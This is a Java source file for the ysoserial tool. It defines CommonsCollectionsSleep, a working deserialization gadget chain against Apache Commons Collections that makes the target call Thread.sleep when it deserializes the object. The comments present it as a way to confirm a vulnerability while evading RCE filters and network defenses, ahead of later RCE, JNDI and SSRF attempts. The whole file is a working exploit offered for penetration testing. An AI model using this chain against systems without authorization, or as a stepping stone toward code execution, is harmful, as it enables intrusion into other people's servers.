package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Blind time-based deserialization detection — NO outbound connection, NO RCE.
	Confirms deserialization vulnerability exists by observing response delay.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → Thread.class
										InvokerTransformer → Thread.sleep(N)

	Why this matters:
		- Works in FULLY firewalled environments (no egress needed)
		- Bypasses ALL RCE-focused filters (no exec, no JNDI, no class loading)
		- Bypasses ALL network-level defenses (no DNS, no HTTP, no TCP out)
		- Only observable side-effect is response timing
		- Thread.sleep() is NEVER blocklisted — it's core JDK threading
		- Confirms deser vuln exists before attempting RCE/SSRF

	Pentesting workflow:
		1. Send sleep(5000) payload → response takes 5s longer → vuln confirmed
		2. Then try RCE/JNDI/SSRF chains with confidence
		3. If all RCE sinks are blocked, sleep alone proves the finding

	Usage: payload arg = milliseconds to sleep
		e.g. "5000" (5 seconds)

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsSleep extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String millisStr) throws Exception {

		long millis = Long.parseLong(millisStr);

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Thread.sleep(millis) — static method, no instance needed
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Thread.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"sleep", new Class[] { long.class } }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[] { millis } }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsSleep.class, args);
	}
}
